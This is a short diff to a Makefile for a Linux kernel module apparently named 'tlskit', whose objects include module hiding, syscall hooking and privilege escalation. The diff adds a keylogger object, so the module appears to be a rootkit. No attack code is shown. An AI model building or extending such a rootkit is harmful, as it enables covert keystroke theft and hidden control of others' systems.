@@ -9,7 +9,8 @@ tlskit-objs += 	$(SRC_DIR)/lkm.o \
 				$(SRC_DIR)/module_hiding.o \
 				$(SRC_DIR)/helper.o \
 				$(SRC_DIR)/syscall_hooking.o \
-				$(SRC_DIR)/priv_escalation.o
+				$(SRC_DIR)/priv_escalation.o \
+				$(SRC_DIR)/keylogger.o
 
 tlskit:
 	echo "Compiling lkm tlskit ..."
